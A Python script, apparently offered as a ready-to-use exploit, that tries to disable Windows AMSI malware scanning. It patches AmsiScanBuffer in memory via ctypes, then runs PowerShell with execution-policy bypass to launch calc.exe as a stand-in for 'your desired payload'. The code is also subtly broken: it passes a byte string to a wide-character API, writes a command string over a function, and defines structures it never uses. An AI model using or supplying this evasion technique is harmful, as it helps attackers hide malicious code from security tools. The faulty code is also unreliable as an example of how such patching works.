import ctypes
import subprocess

# Define the function to bypass AMSI
def magic_bypass():
    # Define constants
    initial_start = 0x50000
    negative_offset = 0x50000
    max_offset = 0x1000000
    read_bytes = 0x50000

    # Define APIs using ctypes
    kernel32 = ctypes.windll.kernel32

    # Get handle to current process
    handle = kernel32.GetCurrentProcess()

    # Define the structure for ReadProcessMemory
    class PROCESS_MEMORY_COUNTERS_EX(ctypes.Structure):
        _fields_ = [
            ("cb", ctypes.c_ulong),
            ("PageFaultCount", ctypes.c_ulong),
            ("PeakWorkingSetSize", ctypes.c_size_t),
            ("WorkingSetSize", ctypes.c_size_t),
            ("QuotaPeakPagedPoolUsage", ctypes.c_size_t),
            ("QuotaPagedPoolUsage", ctypes.c_size_t),
            ("QuotaPeakNonPagedPoolUsage", ctypes.c_size_t),
            ("QuotaNonPagedPoolUsage", ctypes.c_size_t),
            ("PagefileUsage", ctypes.c_size_t),
            ("PeakPagefileUsage", ctypes.c_size_t),
            ("PrivateUsage", ctypes.c_size_t),
        ]

    # ReadProcessMemory function
    read_process_memory = kernel32.ReadProcessMemory
    read_process_memory.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
        ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)
    ]
    read_process_memory.restype = ctypes.c_int

    # GetModuleHandle function
    get_module_handle = kernel32.GetModuleHandleW
    get_module_handle.argtypes = [ctypes.c_wchar_p]
    get_module_handle.restype = ctypes.c_void_p

    # GetProcAddress function
    get_proc_address = kernel32.GetProcAddress
    get_proc_address.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    get_proc_address.restype = ctypes.c_void_p

    # Define the payload (replace with your desired payload)
    payload = b'start-process calc.exe'

    # Find the address of AmsiScanBuffer
    amsi_handle = get_module_handle(b'amsi.dll')
    amsi_scan_buffer_address = get_proc_address(amsi_handle, b'AmsiScanBuffer')

    # Bypass AMSI by overwriting the address with a dummy function
    kernel32.WriteProcessMemory(handle, amsi_scan_buffer_address, payload, len(payload), None)

    # Execute the payload
    subprocess.Popen(["powershell", "-ExecutionPolicy", "Bypass", "-Command", "start-process", "calc.exe"])

# Call the function to execute the exploit
magic_bypass()
